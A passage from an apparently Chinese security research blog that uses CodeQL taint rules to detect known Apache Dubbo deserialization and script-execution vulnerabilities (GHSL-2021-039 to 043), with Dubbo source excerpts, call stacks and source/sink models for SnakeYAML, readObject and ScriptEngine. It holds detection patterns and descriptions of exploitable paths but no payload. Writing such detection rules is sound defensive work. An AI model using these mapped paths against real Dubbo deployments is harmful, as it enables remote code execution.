(org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h3 id="5-1-Source"><a href="#5-1-Source" class="headerlink" title="5.1 Source"></a>5.1 Source</h3><p>CodeQL 默认添加了io.netty相关的传播逻辑，但是Dubbo 2.7.8用的是org.jboss.netty，org.jboss.netty已经迁移到了io.netty，参考【3】<br><img src="/images/pasted-667.png" alt="upload successful"></p><h4 id="5-1-1-jboss-netty"><a href="#5-1-1-jboss-netty" class="headerlink" title="5.1.1 jboss netty"></a>5.1.1 jboss netty</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extensions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">addsTo:</span></span><br><span class="line">      <span class="attr">pack:</span> <span class="string">codeql/java-all</span></span><br><span class="line">      <span class="attr">extensible:</span> <span class="string">sourceModel</span></span><br><span class="line">    <span class="attr">data:</span></span><br><span class="line">      <span class="comment"># attention: no Argument, use Parameter, just test it</span></span><br><span class="line">      <span class="bullet">-</span> [<span class="string">&quot;org.jboss.netty.channel&quot;</span>, <span class="string">&quot;SimpleChannelHandler&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;messageReceived&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Parameter[1]&quot;</span>, <span class="string">&quot;remote&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">addsTo:</span></span><br><span class="line">      <span class="attr">pack:</span> <span class="string">codeql/java-all</span></span><br><span class="line">      <span class="attr">extensible:</span> <span class="string">summaryModel</span></span><br><span class="line">    <span class="attr">data:</span></span><br><span class="line">      <span class="bullet">-</span> [<span class="string">&quot;org.jboss.netty.channel&quot;</span>, <span class="string">&quot;MessageEvent&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;getMessage&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[this]&quot;</span>, <span class="string">&quot;ReturnValue&quot;</span>, <span class="string">&quot;taint&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br></pre></td></tr></table></figure><p>尝试之后会发现污点可以直接到中间节点DubboProtocol$1#received</p><p><img src="/images/pasted-666.png" alt="upload successful"></p><p>但是这只是巧合，</p><h4 id="5-1-2-巧合"><a href="#5-1-2-巧合" class="headerlink" title="5.1.2 巧合"></a>5.1.2 巧合</h4><p>这个case很特殊，真实的流程如下</p><p>ChannelEventRunnable.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runnable</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChannelEventRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>再往上一层 AllChannelHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AllChannelHandler</span> <span class="keyword">extends</span> <span class="title">WrappedChannelHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AllChannelHandler</span><span class="params">(ChannelHandler handler, URL url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(handler, url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">received</span><span class="params">(Channel channel, Object message)</span> <span class="keyword">throws</span> RemotingException </span>&#123;</span><br><span class="line">        ExecutorService executor = getPreferredExecutorService(message);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            executor.execute(<span class="keyword">new</span> ChannelEventRunnable(channel, handler, ChannelState.RECEIVED, message));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        <span class="keyword">if</span>(message <span class="keyword">instanceof</span> Request &amp;&amp; t <span class="keyword">instanceof</span> RejectedExecutionException)&#123;</span><br><span class="line">                sendFeedback(channel, (Request) message, t);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ExecutionException(message, channel, getClass() + <span class="string">&quot; error when process received event .&quot;</span>, t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续往上到Netty Server服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NettyHandler</span> <span class="keyword">extends</span> <span class="title">SimpleChannelHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">messageReceived</span><span class="params">(ChannelHandlerContext ctx, MessageEvent e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        NettyChannel channel = NettyChannel.getOrAddChannel(ctx.getChannel(), url, handler);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            handler.received(channel, e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            NettyChannel.removeChannelIfDisconnected(ctx.getChannel());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>真实的调用栈应该如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NettyHandler#messageReceived</span><br><span class="line">AllChannelHandler#received</span><br><span class="line">    ChannelEventRunnable#&lt;init&gt;</span><br><span class="line">    ChannelEventRunnable#run</span><br><span class="line">        DecodeHandler#received</span><br><span class="line">            HeaderExchangeHandler#received</span><br><span class="line">        DubboProtocol$1#received</span><br><span class="line">        DubboProtocol$1#reply</span><br></pre></td></tr></table></figure><h4 id="5-1-3-Additional-ExecutorService"><a href="#5-1-3-Additional-ExecutorService" class="headerlink" title="5.1.3 Additional ExecutorService"></a>5.1.3 Additional ExecutorService</h4><p>CodeQL 中提供的Additional 接口是针对污点到污点的，没有增加Call流程的，该怎么处理？</p><blockquote><p>TODO: 如何把implements Runnable中的&lt;init&gt; 和run 关联起来？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ChannelEventRunnable#&lt;init&gt;</span><br><span class="line">ChannelEventRunnable#run</span><br></pre></td></tr></table></figure><h3 id="5-2-Sink"><a href="#5-2-Sink" class="headerlink" title="5.2 Sink"></a>5.2 Sink</h3><h4 id="5-2-1-javanative"><a href="#5-2-1-javanative" class="headerlink" title="5.2.1 javanative"></a>5.2.1 javanative</h4><p>这个就是ObjectInputStream#readObject</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exists( MethodAccess ma|</span><br><span class="line">  ma.getMethod().hasName(&quot;readObject&quot;)</span><br><span class="line">  and ma.getQualifier() &#x3D; sink.asExpr()</span><br><span class="line">  and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="5-2-2-JavaBean"><a href="#5-2-2-JavaBean" class="headerlink" title="5.2.2 JavaBean"></a>5.2.2 JavaBean</h4><p>可以抽象出规则</p><ol><li>newInstance Object</li><li>setter/getter Method</li><li>call Method.invoke(Object, args)</li></ol><h4 id="5-2-3-Pojo"><a href="#5-2-3-Pojo" class="headerlink" title="5.2.3 Pojo"></a>5.2.3 Pojo</h4><h3 id="5-3-QL-Result"><a href="#5-3-QL-Result" class="headerlink" title="5.3 QL Result"></a>5.3 QL Result</h3><h4 id="5-3-1-匿名内部内"><a href="#5-3-1-匿名内部内" class="headerlink" title="5.3.1 匿名内部内"></a>5.3.1 匿名内部内</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)</span><br><span class="line">reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)</span><br></pre></td></tr></table></figure><p>DubboProtocol.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ExchangeHandler requestHandler = <span class="keyword">new</span> ExchangeHandlerAdapter() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CompletableFuture&lt;Object&gt; <span class="title">reply</span><span class="params">(ExchangeChannel channel, Object message)</span> <span class="keyword">throws</span> RemotingException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(message <span class="keyword">instanceof</span> Invocation)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RemotingException(channel, <span class="string">&quot;Unsupported request: &quot;</span></span><br><span class="line">                    + (message == <span class="keyword">null</span> ? <span class="keyword">null</span> : (message.getClass().getName() + <span class="string">&quot;: &quot;</span> + message))</span><br><span class="line">                    + <span class="string">&quot;, channel: consumer: &quot;</span> + channel.getRemoteAddress() + <span class="string">&quot; --&gt; provider: &quot;</span> + channel.getLocalAddress());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Invocation inv = (Invocation) message;</span><br><span class="line">        Invoker&lt;?&gt; invoker = getInvoker(channel, inv);</span><br></pre></td></tr></table></figure><p>ProtocolFilterWrapper.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Invoker&lt;T&gt; <span class="title">buildInvokerChain</span><span class="params">(<span class="keyword">final</span> Invoker&lt;T&gt; invoker, String key, String group)</span> </span>&#123;</span><br><span class="line">    Invoker&lt;T&gt; last = invoker;</span><br><span class="line">    List&lt;Filter&gt; filters = ExtensionLoader.getExtensionLoader(Filter.class).getActivateExtension(invoker.getUrl(), key, group);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filters.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = filters.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">final</span> Filter filter = filters.get(i);</span><br><span class="line">            <span class="keyword">final</span> Invoker&lt;T&gt; next = last;</span><br><span class="line">            last = <span class="keyword">new</span> Invoker&lt;T&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Result <span class="title">invoke</span><span class="params">(Invocation invocation)</span> <span class="keyword">throws</span> RpcException </span>&#123;</span><br></pre></td></tr></table></figure><blockquote><p>结论：CodeQL 支持匿名内部内的跟踪<br><img src="/images/pasted-668.png" alt="upload successful"></p></blockquote><h4 id="5-3-2-强制类型转化"><a href="#5-3-2-强制类型转化" class="headerlink" title="5.3.2 强制类型转化"></a>5.3.2 强制类型转化</h4><p>实际上污点可以传播值GenericFilter，但是到这里污点类型已经只是普通的Object，导致后续各种逻辑无法继续<br><img src="/images/pasted-669.png" alt="upload successful"></p><p>疑问，inv 有强制类型转换为Invocation，但是为何污点信息还是个Object？</p><blockquote><p>TODO</p></blockquote><h2 id="0x06-GHSL-2021-039"><a href="#0x06-GHSL-2021-039" class="headerlink" title="0x06 GHSL-2021-039"></a>0x06 GHSL-2021-039</h2><blockquote><p>CVE-2021-32824<br>GHSL-2021-039 Dubbo支持Telnet，包括invoke 调用，原理和CVE-2021-30179 PojoUtils 利用类似</p></blockquote><h3 id="6-1-Source"><a href="#6-1-Source" class="headerlink" title="6.1 Source"></a>6.1 Source</h3><h3 id="6-2-Sink"><a href="#6-2-Sink" class="headerlink" title="6.2 Sink"></a>6.2 Sink</h3><h3 id="6-3-QL-Result"><a href="#6-3-QL-Result" class="headerlink" title="6.3 QL Result"></a>6.3 QL Result</h3><h2 id="0x07-GHSL-2021-040-041-043"><a href="#0x07-GHSL-2021-040-041-043" class="headerlink" title="0x07 GHSL-2021-040/041/043"></a>0x07 GHSL-2021-040/041/043</h2><blockquote><p>CVE-2021-30180</p><ol><li>GHSL-2021-040/GHSL-2021-041 Dubbo的路由实现支持多种，例如Tag路由、Condition路由，它两都支持动态配置，具体实现是以yml格式写入kafka配置中，再交由consumer去解析，consumer采用的是snakeyaml，存在反序列化漏洞。</li><li>GHSL-2021-043: Dubbo还支持动态配置，原理与router config类似，不过是由provider来加载，最终调用snakeyaml实现反序列化。</li></ol></blockquote><h3 id="7-1-Source"><a href="#7-1-Source" class="headerlink" title="7.1 Source"></a>7.1 Source</h3><h4 id="7-1-1-zookeeper-source"><a href="#7-1-1-zookeeper-source" class="headerlink" title="7.1.1 zookeeper source"></a>7.1.1 zookeeper source</h4><p>注意：此处Source不全，未覆盖forPath的用法，后续还有针对forPath的用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class CuratorSource extends RemoteFlowSource &#123;</span><br><span class="line">  CuratorSource() &#123;</span><br><span class="line">    (</span><br><span class="line">      exists(MethodAccess ma |</span><br><span class="line">        this.asExpr() &#x3D; ma</span><br><span class="line">        and ma.getMethod().hasName(&quot;getData&quot;)</span><br><span class="line">        and ma.getMethod().getDeclaringType().getASourceSupertype*().hasQualifiedName(&quot;org.apache.curator.framework.recipes.cache&quot;, &quot;TreeCacheEvent&quot;)</span><br><span class="line">      )</span><br><span class="line">      or </span><br><span class="line">      exists(MethodAccess ma |</span><br><span class="line">        this.asExpr() &#x3D; ma</span><br><span class="line">        and ma.getMethod().hasName(&quot;getData&quot;)</span><br><span class="line">        and ma.getMethod().getDeclaringType().getASourceSupertype*().hasQualifiedName(&quot;org.apache.curator.framework.recipes.cache&quot;, &quot;ChildData&quot;)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    and not this.getLocation().getFile().getRelativePath().matches(&quot;%&#x2F;src&#x2F;test&#x2F;%&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">  override string getSourceType() &#123; result &#x3D; &quot;Zookeeper Source&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7-1-2-sourceModel-RemoteFlowSource"><a href="#7-1-2-sourceModel-RemoteFlowSource" class="headerlink" title="7.1.2 sourceModel != RemoteFlowSource ?"></a>7.1.2 sourceModel != RemoteFlowSource ?</h4><blockquote><p>注意在yml文件中配置的sourceModel并没有自动加入RemoteFlowSource</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private class ExternalRemoteFlowSource extends RemoteFlowSource &#123;</span><br><span class="line">  ExternalRemoteFlowSource() &#123; sourceNode(this, &quot;remote&quot;) &#125;</span><br><span class="line"></span><br><span class="line">  override string getSourceType() &#123; result &#x3D; &quot;external&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>原因为kind字段必须为remote的才会自动加载为ExternalRemoteFlowSource，否则不会，其实是自己笔误，拷贝了summaryModel 的kind =’taint’，改为’remote’之后ok</p></blockquote><h3 id="7-2-Sink"><a href="#7-2-Sink" class="headerlink" title="7.2 Sink"></a>7.2 Sink</h3><h4 id="7-2-1-Yaml-反序列化"><a href="#7-2-1-Yaml-反序列化" class="headerlink" title="7.2.1 Yaml 反序列化"></a>7.2.1 Yaml 反序列化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">  exists( MethodAccess ma|</span><br><span class="line">    ma.getMethod().hasName(&quot;load&quot;)</span><br><span class="line">    and ma.getAnArgument() &#x3D; sink.asExpr()</span><br><span class="line">    and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;org.yaml.snakeyaml&quot;, &quot;Yaml&quot;)</span><br><span class="line">  )</span><br><span class="line">  and not sink.getLocation().getFile().getRelativePath().matches(&quot;%&#x2F;src&#x2F;test&#x2F;%&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-3-QL-Result"><a href="#7-3-QL-Result" class="headerlink" title="7.3 QL Result"></a>7.3 QL Result</h3><ol><li><input checked="" disabled="" type="checkbox"> TagRuleParser<br> <img src="/images/pasted-651.png" alt="upload successful"></li><li><input checked="" disabled="" type="checkbox"> ConfigParser<br> <img src="/images/pasted-652.png" alt="upload successful"></li><li><input checked="" disabled="" type="checkbox"> ConditionRuleParser<br> <img src="/images/pasted-653.png" alt="upload successful"></li></ol><h2 id="0x08-GHSL-2021-042"><a href="#0x08-GHSL-2021-042" class="headerlink" title="0x08 GHSL-2021-042"></a>0x08 GHSL-2021-042</h2><blockquote><p>CVE-2021-30181<br>GHSL-2021-042 与上一个漏洞类似，还支持Script路由，Script引擎用的Nashorn，存在命令执行</p></blockquote><p>与以往的漏洞都是攻击provider 不同，这个漏洞攻击的是consumer</p><h3 id="8-1-Sink"><a href="#8-1-Sink" class="headerlink" title="8.1 Sink"></a>8.1 Sink</h3><p>Sink CodeQL 点实际默认也有</p><h4 id="8-1-1-ScriptEngine"><a href="#8-1-1-ScriptEngine" class="headerlink" title="8.1.1 ScriptEngine"></a>8.1.1 ScriptEngine</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extensions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">addsTo:</span></span><br><span class="line">      <span class="attr">pack:</span> <span class="string">codeql/java-all</span></span><br><span class="line">      <span class="attr">extensible:</span> <span class="string">sinkModel</span></span><br><span class="line">    <span class="attr">data:</span></span><br><span class="line">      <span class="bullet">-</span> [<span class="string">&quot;javax.script&quot;</span>, <span class="string">&quot;CompiledScript&quot;</span>, <span class="literal">False</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[this]&quot;</span>, <span class="string">&quot;mvel&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line">      <span class="bullet">-</span> [<span class="string">&quot;javax.script&quot;</span>, <span class="string">&quot;ScriptEngine&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;mvel&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-655.png" alt="upload successful"></p><p>Sink点没问题，按漏洞原理来讲Source也应该是Zookeeper，但是实际跑来，并没有结果</p><h3 id="8-2-Source"><a href="#8-2-Source" class="headerlink" title="8.2 Source"></a>8.2 Source</h3><p><img src="/images/pasted-657.png" alt="upload successful"></p><p>但是从调用栈上看不出来何时读取的zookeeper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">eval:511, NashornScriptEngine$3 (jdk.nashorn.api.scripting)</span><br><span class="line">eval:92, CompiledScript (javax.script)</span><br><span class="line">route:115, ScriptRouter (org.apache.dubbo.rpc.cluster.router.script)</span><br><span class="line">route:99, RouterChain (org.apache.dubbo.rpc.cluster)</span><br><span class="line">doList:520, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">list:87, AbstractDirectory (org.apache.dubbo.rpc.cluster.directory)</span><br><span class="line">list:297, AbstractClusterInvoker (org.apache.dubbo.rpc.cluster.support)</span><br><span class="line">invoke:262, AbstractClusterInvoker (org.apache.dubbo.rpc.cluster.support)</span><br><span class="line">intercept:47, ClusterInterceptor (org.apache.dubbo.rpc.cluster.interceptor)</span><br><span class="line">invoke:92, AbstractCluster$InterceptorInvokerNode (org.apache.dubbo.rpc.cluster.support.wrapper)</span><br><span class="line">invoke:93, MockClusterInvoker (org.apache.dubbo.rpc.cluster.support.wrapper)</span><br><span class="line">invoke:132, InterfaceCompatibleRegistryProtocol$MigrationInvoker (org.apache.dubbo.registry.integration)</span><br><span class="line">invoke:83, InvokerInvocationHandler (org.apache.dubbo.rpc.proxy)</span><br><span class="line">sayHello:-1, proxy0 (org.apache.dubbo.common.bytecode)</span><br><span class="line">main:41, BasicConsumer (org.apache.dubbo.samples.governance)</span><br></pre></td></tr></table></figure><p>定位发现，是zookeeper forPath()</p><p><img src="/images/pasted-658.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">addTargetChildListener</span><span class="params">(String path, CuratorWatcherImpl listener)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (List)((BackgroundPathable)<span class="keyword">this</span>.client.getChildren().usingWatcher(listener)).forPath(path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (KeeperException.NoNodeException var4) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(var5.getMessage(), var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="8-2-1-Kafaka-forPath-Source"><a href="#8-2-1-Kafaka-forPath-Source" class="headerlink" title="8.2.1 Kafaka forPath Source"></a>8.2.1 Kafaka forPath Source</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  exists(MethodAccess ma |</span><br><span class="line">    this.asExpr() &#x3D; ma</span><br><span class="line">    and ma.getMethod().hasName(&quot;forPath&quot;)</span><br><span class="line">    and ma.getMethod().getNumberOfParameters() &#x3D; 1</span><br><span class="line">    and ma.getMethod().getDeclaringType().getASourceSupertype*().hasQualifiedName(&quot;org.apache.curator.framework.api&quot;, &quot;Pathable&quot;)</span><br><span class="line">    and not ma.getCallee().getReturnType().toString() in [&quot;Stat&quot;, &quot;Void&quot;]</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>TODO：这种整个methodAccess 作为taint的该怎么写yml SourceModule？</p></blockquote><h3 id="8-3-Addintional"><a href="#8-3-Addintional" class="headerlink" title="8.3 Addintional"></a>8.3 Addintional</h3><h4 id="8-3-1-computeIfAbsent"><a href="#8-3-1-computeIfAbsent" class="headerlink" title="8.3.1 computeIfAbsent"></a>8.3.1 computeIfAbsent</h4><p>org.apache.dubbo.registry.support.AbstractRegistry#notify</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Iterator var5 = urls.iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var5.hasNext()) &#123;</span><br><span class="line">    URL u = (URL)var5.next();</span><br><span class="line">    <span class="keyword">if</span> (UrlUtils.isMatch(url, u)) &#123;</span><br><span class="line">        String category = u.getParameter(<span class="string">&quot;category&quot;</span>, <span class="string">&quot;providers&quot;</span>);</span><br><span class="line">        List&lt;URL&gt; categoryList = (List)result.computeIfAbsent(category, (k) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ArrayList();</span><br><span class="line">        &#125;);</span><br><span class="line">        categoryList.add(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result.size() != <span class="number">0</span>) &#123;</span><br><span class="line">    Map&lt;String, List&lt;URL&gt;&gt; categoryNotified = (Map)<span class="keyword">this</span>.notified.computeIfAbsent(url, (ux) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ConcurrentHashMap();</span><br><span class="line">    &#125;);</span><br><span class="line">    Iterator var11 = result.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var11.hasNext()) &#123;</span><br><span class="line">        Map.Entry&lt;String, List&lt;URL&gt;&gt; entry = (Map.Entry)var11.next();</span><br><span class="line">        String category = (String)entry.getKey();</span><br><span class="line">        List&lt;URL&gt; categoryList = (List)entry.getValue();</span><br><span class="line">        categoryNotified.put(category, categoryList);</span><br><span class="line">        listener.notify(categoryList);</span><br></pre></td></tr></table></figure><p>这里有一个computeIfAbsent 的相关逻辑</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> [<span class="string">&quot;java.util&quot;</span>, <span class="string">&quot;Map&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;computeIfAbsent&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[this].MapValue&quot;</span>, <span class="string">&quot;ReturnValue&quot;</span>, <span class="string">&quot;value&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">&quot;java.util&quot;</span>, <span class="string">&quot;Map&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;computeIfAbsent&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[1].ReturnValue&quot;</span>, <span 